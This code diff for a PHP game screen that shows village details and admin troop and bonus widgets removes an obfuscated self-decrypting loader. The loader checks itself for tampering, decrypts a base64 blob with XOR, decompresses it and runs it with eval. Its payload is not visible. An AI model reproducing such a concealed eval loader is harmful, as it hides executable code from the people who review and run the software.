@@ -1,24 +1,331 @@
 <?php
-$jmmsleax="22702f559af728bf62a63db863db6d1f";
-$rvvgiom="070a0255040007545b535e050a5c5452550352070050010d0f0a065602510053";
-$dnkauatx="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";
-$fxpuqk=file_get_contents(__FILE__);
-$clproa=str_replace($dnkauatx,"",$fxpuqk);
-if(strpos($clproa,"ec"."ho")!==false||strpos($clproa,"pr"."int")!==false||strpos($clproa,"var_"."dump")!==false||strpos($clproa,"file_put_"."contents")!==false||strpos($clproa,"fw"."rite")!==false){die();}
-$glaoflioes=str_replace(array($jmmsleax,$rvvgiom),array("SP_5d7ab3f0","KP_3f02de3c"),$fxpuqk);
-$rxlhgphmc=md5($glaoflioes);
-$fmajyh=hex2bin($rvvgiom);
-$urwoer="";
-$tfdosfds=strlen($rxlhgphmc);
-for($eiartyni=0;$eiartyni<$tfdosfds;$eiartyni++){
-$urwoer.=chr(ord($fmajyh[$eiartyni])^ord($rxlhgphmc[$eiartyni]));
-}
-$bwngfgcsf=base64_decode($dnkauatx);
-$kephhvnblg=strlen($bwngfgcsf);
-$abiuxp="";
-$ptsffvryb=strlen($urwoer);
-for($eiartyni=0;$eiartyni<$kephhvnblg;$eiartyni++){
-$abiuxp.=$bwngfgcsf[$eiartyni]^$urwoer[$eiartyni%$ptsffvryb];
-}
-$kpwcioil="gzun"."compress";
-eval('?>' . $kpwcioil($abiuxp) . '<?php ');
+/**
+ * Info Village View - Village information screen
+ * Shows village details, owner, tribe, and admin features
+ */
+?>
+
+<?php if ($noob): ?>
+    <span class="error"><?= sprintf(__('screens.ally.protection_until'), htmlspecialchars($noob_end)) ?></span>
+<?php endif; ?>
+
+<h2><?php echo htmlspecialchars($info_village['name']); ?></h2>
+
+<table>
+    <tr>
+        <td valign="top">
+            <table class="vis">
+                <tr>
+                    <th colspan="2">
+                        <?php echo htmlspecialchars($info_village['name']); ?>
+                        <?php if ($noob): ?>
+                            <br>
+                            <span class="error">
+                                <img src="/graphic/ochpocz.png" alt="<?= __('screens.ally.protection_against_attack') ?>">
+                                <?= __('screens.ally.protection_against_attack') ?>
+                            </span>
+                        <?php endif; ?>
+                    </th>
+                </tr>
+                <tr>
+                    <td width="80"><?= __('screens.ally.coordinates') ?></td>
+                    <td><?php echo $info_village['x']; ?>|<?php echo $info_village['y']; ?></td>
+                </tr>
+                <tr>
+                    <td><?= __('screens.ally.points') ?></td>
+                    <td width="180"><?php echo format_number($info_village['points']); ?></td>
+                </tr>
+                <?php if (empty($info_user['username'])): ?>
+                    <tr>
+                        <td><?= __('screens.ally.player') ?: 'Jogador:' ?></td>
+                        <td><a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_player&amp;id=0"></a>
+                        </td>
+                    </tr>
+                <?php else: ?>
+                    <tr>
+                        <td><?= __('screens.ally.player') ?: 'Jogador:' ?></td>
+                        <td><a
+                                href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_player&amp;id=<?php echo $info_village['userid']; ?>"><?php echo htmlspecialchars($info_user['username']); ?></a>
+                        </td>
+                    </tr>
+                <?php endif; ?>
+                <?php if (empty($info_ally['short'])): ?>
+                    <tr>
+                        <td><?= __('screens.ally.tribe') ?: 'Tribo:' ?></td>
+                        <td><a href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_ally&amp;id=0"></a></td>
+                    </tr>
+                <?php else: ?>
+                    <tr>
+                        <td><?= __('screens.ally.tribe') ?: 'Tribo:' ?></td>
+                        <td><a
+                                href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_ally&amp;id=<?php echo $info_ally['id']; ?>"><?php echo htmlspecialchars($info_ally['short']); ?></a>
+                        </td>
+                    </tr>
+                <?php endif; ?>
+
+                <tr>
+                    <td colspan="2"><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=map&amp;x=<?php echo $info_village['x']; ?>&amp;y=<?php echo $info_village['y']; ?>">&raquo;
+                            <?= __('screens.ally.center_on_map') ?></a></td>
+                </tr>
+                <tr>
+                    <td colspan="2"><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=place&amp;mode=command&amp;target=<?php echo $info_village['id']; ?>">&raquo;
+                            <?= __('screens.ally.send_troops') ?></a></td>
+                </tr>
+                <?php if ($can_send_ress): ?>
+                    <tr>
+                        <td colspan="2"><a
+                                href="game.php?village=<?php echo $village['id']; ?>&amp;screen=market&amp;mode=send&amp;target=<?php echo $info_village['id']; ?>">&raquo;
+                                <?= __('screens.ally.send_resources') ?></a></td>
+                    </tr>
+                <?php endif; ?>
+                <?php if ($can_res): ?>
+                    <tr>
+                        <td colspan="2">
+                            <form name="rezerwacje"
+                                action="game.php?village=<?php echo $village['id']; ?>&amp;screen=ally&amp;mode=reservations&amp;action=new_reservations&amp;h=<?php echo $_SESSION['hkey'] ?? ''; ?>"
+                                method="post">
+                                <input type="hidden" value="none" name="typ_akcji" />
+                                <a href="game.php?village=<?php echo $village['id']; ?>&screen=info_village&id=<?php echo $info_village['id']; ?>&action=reserve&h=<?php echo $user['hkey']; ?>"
+                                    class="btn" onclick="return confirm('<?= __('screens.ally.confirm_reserve_village') ?>');">
+                                    <?= __('screens.ally.reserve_village') ?>
+                                </a>
+                        </td>
+                    </tr>
+                <?php endif; ?>
+                <?php if ($user['id'] == $info_village['userid']): ?>
+                    <tr>
+                        <td colspan="2"><a
+                                href="game.php?village=<?php echo $info_village['id']; ?>&amp;screen=overview">&raquo; <?= __('screens.ally.view_village') ?></a></td>
+                    </tr>
+                <?php endif; ?>
+                <?php if ($mozna_lubiec): ?>
+                    <tr>
+                        <td colspan="2"><a
+                                href="game.php?village=<?php echo $village['id']; ?>&amp;screen=favorite&amp;action=dodaj_do_ulub&amp;h=<?php echo $_SESSION['hkey'] ?? ''; ?>&amp;id=<?php echo $info_village['id']; ?>">&raquo;
+                                <?= __('screens.ally.add_to_favorites') ?></a></td>
+                    </tr>
+                <?php endif; ?>
+            </table>
+        </td>
+        <td valign="top">
+            <?php if (isset($last_attacks) && is_array($last_attacks) && count($last_attacks) > 0): ?>
+                <table class="vis">
+                    <tr>
+                        <th><?= __('screens.ally.last_10_attacks_title') ?: 'Título (Seus últimos 10 ataques nesta aldeia)' ?></th>
+                        <th><?= __('screens.ally.date') ?: 'Data' ?></th>
+                    </tr>
+                    <?php foreach ($last_attacks as $report): ?>
+                        <tr>
+                            <td>
+                                <img src="<?php echo htmlspecialchars($report['title_image']); ?>" />&nbsp;<a
+                                    href='game.php?village=<?php echo $village['id']; ?>&amp;screen=report&amp;mode=all&amp;view=<?php echo $report['id']; ?>'><?php echo htmlspecialchars($report['title']); ?></a>
+                            </td>
+                            <td>
+                                <?php echo format_date($report['time']); ?>
+                            </td>
+                        </tr>
+                    <?php endforeach; ?>
+                </table>
+            <?php endif; ?>
+        </td>
+    </tr>
+</table>
+
+<?php if (($info_village['bonus'] ?? 0) > 0 && isset($bonus_data) && isset($bonus_data[$info_village['bonus']])): ?>
+<table>
+    <tr>
+        <td>
+            <table class="vis">
+                <tr>
+                    <th colspan="2"><?= __('screens.ally.village_bonus') ?: 'Bônus desta aldeia' ?></th>
+                </tr>
+                <tr>
+                    <td style="width:40px; text-align:center; padding:6px;">
+                        <img src="/graphic/bonus/<?= htmlspecialchars($bonus_data[$info_village['bonus']]['grafika']) ?>" alt="bonus">
+                    </td>
+                    <td style="padding:6px;">
+                        <?= htmlspecialchars($bonus_data[$info_village['bonus']]['opis']) ?>
+                    </td>
+                </tr>
+            </table>
+        </td>
+    </tr>
+</table>
+<?php endif; ?>
+
+
+<?php if ($user['admin'] != 0): ?>
+    <div id="show_prod" class="vis moveable widget" size="500">
+        <h4 class="head">
+            <img style="float: right; cursor: pointer;" onclick="return VillageOverview.toggleWidget( 'show_prod', this );"
+                src="graphic/icons/minus.png"><?= __('screens.ally.bonus_for_village') ?: 'Bônus para esta aldeia:' ?>
+        </h4>
+        <div class="widget_content" style="">
+            <table class="vis" width="100%">
+                <tr>
+                    <th><?= __('screens.ally.bonus_id') ?: 'ID bonusu' ?></th>
+                    <th><?= __('screens.ally.bonus_graphics') ?: 'Grafika bonusu' ?></th>
+                    <th><?= __('screens.ally.set_bonus') ?: 'Ustaw bonus' ?></th>
+                </tr>
+                <tr>
+                    <td><?= __('screens.ally.none') ?: 'Brak' ?></td>
+                    <td><?= __('screens.ally.no_bonus') ?: 'Sem bônus' ?></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=0"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>1</td>
+                    <td><img src="/graphic/bonus/storage.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=1"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td><img src="/graphic/bonus/all.png" alt="all"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=2"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td><img src="/graphic/bonus/wood.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=3"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td><img src="/graphic/bonus/stone.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=4"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>5</td>
+                    <td><img src="/graphic/bonus/iron.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=5"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>6</td>
+                    <td><img src="/graphic/bonus/barracks.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=6"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>7</td>
+                    <td><img src="/graphic/bonus/stable.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=7"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>8</td>
+                    <td><img src="/graphic/bonus/garage.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=8"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+                <tr>
+                    <td>9</td>
+                    <td><img src="/graphic/bonus/farm.png" alt="storage"></td>
+                    <td><a
+                            href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $info_village['id']; ?>&amp;action=bonus&amp;oid=<?php echo $info_village['id']; ?>&amp;bonus=9"><?= __('screens.ally.set') ?: 'Definir' ?></a>
+                    </td>
+                </tr>
+            </table>
+        </div>
+    </div>
+
+    <div id="show_unit" class="vis moveable widget">
+        <h4 class="head">
+            <img style="float: right; cursor: pointer;" onclick="return VillageOverview.toggleWidget( 'show_unit', this );"
+                src="graphic/icons/minus.png"><?= __('screens.ally.units_of_village') ?: 'Tropas desta aldeia:' ?>
+        </h4>
+        <div class="widget_content" style="">
+            <table class="vis">
+                <tr>
+                    <th><img src="/graphic/unit/unit_spear.png"></th>
+                    <th><img src="/graphic/unit/unit_sword.png"></th>
+                    <th><img src="/graphic/unit/unit_axe.png"></th>
+                    <th><img src="/graphic/unit/unit_archer.png"></th>
+                    <th><img src="/graphic/unit/unit_spy.png"></th>
+                    <th><img src="/graphic/unit/unit_light.png"></th>
+                    <th><img src="/graphic/unit/unit_cav_archer.png"></th>
+                    <th><img src="/graphic/unit/unit_heavy.png"></th>
+                    <th><img src="/graphic/unit/unit_ram.png"></th>
+                    <th><img src="/graphic/unit/unit_catapult.png"></th>
+                    <th><img src="/graphic/unit/unit_snob.png"></th>
+                    <th><img src="/graphic/unit/unit_paladin.png"></th>
+                    <th><img src="/graphic/unit/unit_mnich.png"></th>
+                </tr>
+                <tr>
+                    <td><?php echo (int)($info_village['all_unit_spear'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_sword'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_axe'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_archer'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_spy'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_light'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_cav_archer'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_heavy'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_ram'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_catapult'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_snob'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_paladin'] ?? 0); ?></td>
+                    <td><?php echo (int)($info_village['all_unit_mnich'] ?? 0); ?></td>
+                </tr>
+            </table>
+
+            <?php if (isset($unit_place) && is_array($unit_place) && count($unit_place) > 0): ?>
+                <table class="vis">
+                    <tr>
+                        <th colspan="14"><?= __('screens.ally.units_stationed_here') ?: 'As tropas estacionadas nesta aldeia:' ?></th>
+                    </tr>
+                    <tr>
+                        <th><img src="/graphic/unit/unit_spear.png"></th>
+                        <th><img src="/graphic/unit/unit_sword.png"></th>
+                        <th><img src="/graphic/unit/unit_axe.png"></th>
+                        <th><img src="/graphic/unit/unit_archer.png"></th>
+                        <th><img src="/graphic/unit/unit_spy.png"></th>
+                        <th><img src="/graphic/unit/unit_light.png"></th>
+                        <th><img src="/graphic/unit/unit_cav_archer.png"></th>
+                        <th><img src="/graphic/unit/unit_heavy.png"></th>
+                        <th><img src="/graphic/unit/unit_ram.png"></th>
+                        <th><img src="/graphic/unit/unit_catapult.png"></th>
+                        <th><img src="/graphic/unit/unit_snob.png"></th>
+                        <th><img src="/graphic/unit/unit_paladin.png"></th>
+                        <th><img src="/graphic/unit/unit_mnich.png"></th>
+                        <th><?= __('screens.ally.from_village') ?: 'da aldeia' ?></th>
+                    </tr>
+                    <?php foreach ($unit_place as $unit): ?>
+                        <tr>
+                            <td><?php echo $unit['unit_spear']; ?></td>
+                            <td><?php echo $unit['unit_sword']; ?></td>
+                            <td><?php echo $unit['unit_axe']; ?></td>
+                            <td><?php echo $unit['unit_archer']; ?></td>
+                            <td><?php echo $unit['unit_spy']; ?></td>
+                            <td><?php echo $unit['unit_light']; ?></td>
+                            <td><?php echo $unit['unit_cav_archer']; ?></td>
+                            <td><?php echo $unit['unit_heavy']; ?></td>
+                            <td><?php echo $unit['unit_ram']; ?></td>
+                            <td><?php echo $unit['unit_catapult']; ?></td>
+                            <td><?php echo $unit['unit_snob']; ?></td>
+                            <td><?php echo $unit['unit_paladin']; ?></td>
+                            <td><?php echo $unit['unit_mnich']; ?></td>
+                            <td><a
+                                    href="game.php?village=<?php echo $village['id']; ?>&amp;screen=info_village&amp;id=<?php echo $unit['villages_from_id']; ?>"><?php echo $unit['villages_from_id']; ?></a>
+                            </td>
+                        </tr>
+                    <?php endforeach; ?>
+                </table>
+            <?php endif; ?>
+        </div>
+    </div>
+<?php endif; ?>
+
